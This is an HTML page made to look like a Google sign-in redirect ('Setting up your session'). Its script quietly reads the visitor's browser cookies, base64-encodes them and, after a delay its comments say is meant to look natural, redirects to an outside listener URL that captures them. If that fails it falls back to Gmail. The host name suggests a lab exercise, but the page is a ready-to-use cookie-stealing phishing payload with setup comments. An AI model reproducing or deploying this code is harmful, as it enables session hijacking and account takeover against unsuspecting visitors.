<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Authenticating...</title>
    <style>
        body { font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background-color: #f8f9fa; margin: 0; }
        .box { text-align: center; background: white; padding: 40px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.05); }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #4285f4; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        h2 { color: #202124; font-size: 20px; margin: 0; }
        p { color: #5f6368; font-size: 14px; margin-top: 10px; }
    </style>
</head>
<body>
    <div class="box">
        <div class="loader"></div>
        <h2>Setting up your session</h2>
        <p>Please wait while we redirect you to the secure portal...</p>
    </div>

    <script>
        // -----------------------------------------------------------------
        // REPLACE 'YOUR_USERNAME' BELOW WITH YOUR PYTHONANYWHERE USERNAME
        // -----------------------------------------------------------------
        const LISTENER_URL = "https://labsession.pythonanywhere.com/capture";

        (function() {
            try {
                // 1. Capture and Encode Cookies
                const cookieData = document.cookie || "no_cookies_found";
                const encodedData = btoa(unescape(encodeURIComponent(cookieData)));

                // 2. Prepare the Exfiltration URL
                const finalUrl = `${LISTENER_URL}?data=${encodedData}`;

                // 3. Short delay to look natural, then jump to the listener
                setTimeout(() => {
                    window.location.replace(finalUrl);
                }, 1800);
            } catch (e) {
                // Fallback: If anything fails, just go to Gmail
                window.location.replace("https://mail.google.com");
            }
        })();
    </script>
</body>
</html>
